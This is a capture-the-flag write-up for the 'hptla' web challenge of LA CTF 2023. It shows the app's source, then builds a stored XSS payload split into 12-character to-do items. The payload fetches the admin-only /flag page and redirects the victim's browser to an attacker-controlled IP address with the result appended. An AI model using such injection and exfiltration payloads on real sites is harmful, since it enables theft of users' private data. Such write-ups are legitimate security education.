---
Title: hptla - LA CTF 2023
Date: 2023-02-15T00:00:00+05:30
Tags: [web, lactf23-writeups, ctf, writeup, xss]
Categories: [lactf23-writeups,All Writeups]
Authors: [Rohit]
---

#### tl;dr

- We can join the two lines either by adding a \` or starting a comment `/*` at the end of one line and closing it `*\` at the start of the next line
- We have to split the payload into 20 parts like that

Final payload 

```html
<img src='
'onerror='`
`;n=fetch;`
`;l=r=>{`
`;return/*
*/r.text();`
`;};`
`;p=q=>{s=/*
*/`http:`;`
`;s+=`//3`;`
`;s+=`4.9`;`
`;s+=`3.5`;`
`;window./*
*/location/*
*/=s+`6.144?
`+q;};`
`;f=`flag`;`
`;w=n(f)/*
*/.then(l)/*
*/.then(p);'
```
<!--more-->

## Description

I made a new hyper-productive to-do list app that limits you to 12 characters per item so you can stop wasting time writing overly intricate to-do lists!

- **Author** : aplet123
- **Category** : Web
- **Points** : 487
- **Solves** : 27


## Solution

### Understanding the challenge

Here we have a page where we can add todos. There is a length limit to the todos as each todo can at most be of length 12. We can only add 20 todos.

Source: 

```js
const express = require("express");
const path = require("path");
const { v4: uuid } = require("uuid");
const cookieParser = require("cookie-parser");

const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";

const app = express();

const lists = new Map();

let cleanup = [];

setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex(x => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j ++) {
        lists.delete(cleanup[j][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);

app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));
app.use((req, res, next) => {
    res.set(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'"
    );
    next();
});
app.use(express.static(path.join(__dirname, "static")));

app.post("/list", (req, res) => {
    res.type("text/plain");
    const list = req.body.list;
    if (typeof list !== "string") {
        res.status(400).send("no list provided");
        return;
    }
    const parsed = list
        .trim()
        .split("\n")
        .map((x) => x.trim());
    if (parsed.length > 20) {
        res.status(400).send("list must have at most 20 items");
        return;
    }
    if (parsed.some((x) => x.length > 12)) {
        res.status(400).send("list items must not exceed 12 characters");
        return;
    }
    const id = uuid();
    lists.set(id, parsed);
    cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
    res.send(id);
});

app.get("/list/:id", (req, res) => {
    res.type("application/json");
    if (lists.has(req.params.id)) {
        res.send(lists.get(req.params.id));
    } else {
        res.status(400).send({error: "list doesn't exist"});
    }
});

app.get("/flag", (req, res) => {
    res.type("text/plain");
    if (req.cookies.adminpw === adminpw) {
        res.send(flag);
    } else {
        res.status(401).send("haha no");
    }
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
});
```

The todos are added using this frontend js

```js
const loading = document.getElementById("loading");
const error = document.getElementById("error");
const list = document.getElementById("list");
const id = location.hash.slice(1);
if (!/^[-0-9a-f]+$/.test(id)) {
    error.innerText = "invalid list id";
    error.classList.remove("hidden");
    loading.classList.add("hidden");
} else {
    (async function () {
        const res = await fetch("/list/" + id);
        try {
            const json = await res.json();
            if (res.status !== 200) {
                error.innerText = json.error;
                error.classList.remove("hidden");
            } else {
                list.innerHTML = json.map((x, i) => `<li><input type="checkbox" id="item${i}"><label for="item${i}">${x}</label></li>`).join("");
                list.classList.remove("hidden");
            }
            loading.classList.add("hidden");
        } catch (err) {
            error.innerText = "something went really wrong";
            error.classList.remove("hidden");
            loading.classList.add("hidden");
        }
    })();
}
```
Here each todo is added to the innerHTML, so there is XSS. But between each todo there as some `li` elements and we can only add 12 characters in one todo. The flag is in `/flag` so we have to fetch it from there and then to our site. So the payload will be quite large.

### Joining the todos

So the first thing we have to do is to get rid of the things in between each todo.

We can start the first todo as `<img src='` then the next with `' onload='`. Here we open `'` on the first todo and close it in the second one. So everything in between will come in the `src` attribute. Now for the 3rd todo onwards we can give the js payload. But we can't anymore use `'` to join as it will close off the `onload` attribute.

So we went with \`, we can put anything in between \`. So we have to put one \` at the end of every todo and \`; at the start of every todo to close it.

![backticks](images/backticks.png)


### Getting the flag

Now we need to find a way to get the flag and send it to our server and make it short. Our first thought was to use `window.open` we can just call that using `open()`
The first 2 characters needed to be \`; and the last 2 characters needed to be ;\` for the joining to work. So we are left with only 8 characters. With just 8 characters, we can't call `open` and save it in a variable. So at first, we tried to save `open` to a variable using `o=open` and then `flag` to another variable using `f="flag"`, then calling `w=o(f)`. Our payload was

```js
<img src='
'onerror='`
`;o=open;`
`;f="flag";`
`;w=o(f);'
```

But that failed and give us this error [Illegal Invocation](https://mtsknn.fi/blog/illegal-invocations-in-js/)

![firsterror](images/firsterror.png)


So we had to use `fetch`. The main reason why we didn't use `fetch` in the first place was that it needed either `await` if we are storing it into a variable or `.then()` otherwise. Both of them not fitting inside the 12 characters. Now we have to bypass this somehow


### Javascript comments

We thought `backticks` was the only way to join queries at first. But then my teammates suggested the idea of using comments `/**/`. Comments are also more efficient than using \` as we don't need to make each todo as separate lines of code now. We also can separate `fetch` and `.then()` by putting comments in between. 

![comments](images/comments.png)

**Average Javascript moment** :sunglasses:

Also, we can use comments to separate `window` and `.location`

### Javascript functions

Now that we can use `.then()` we need a function to pass to it. So that's where javascript's arrow functions come to the rescue. We can use that to create 2 functions. We need one to return the `r.text()` and another one to send the flag to our IP.

First function

```js
`;l=r=>{`
`;return/*
*/r.text();`
`;};`
```

Building the second function was a task. At first, we thought of using `window.name` and redirecting to `window.name+r` as we can set the `window.name` from another site while opening a new window. But that didn't work. So we had to give our IP in the payload.

```js
`;p=q=>{s=/*
*/`http:`;`
`;s+=`//3`;`
`;s+=`4.9`;`
`;s+=`3.5`;`
`;window./*
*/location/*
*/=s+`6.144?
`+q;};`
```

We also need to assign `fetch` to a variable as we can't call that with 12 characters.

```js
`;n=fetch;`
`;w=n(f)/*
*/.then(l)/*
*/.then(p);'
```

Final Payload:

```html
<img src='
'onerror='`
`;n=fetch;`
`;l=r=>{`
`;return/*
*/r.text();`
`;};`
`;p=q=>{s=/*
*/`http:`;`
`;s+=`//3`;`
`;s+=`4.9`;`
`;s+=`3.5`;`
`;window./*
*/location/*
*/=s+`6.144?
`+q;};`
`;f=`flag`;`
`;w=n(f)/*
*/.then(l)/*
*/.then(p);'
```


**Flag**: `lactf{s0_pr0duct1v3_y0u_c4n_3v3n_g3t_xss}`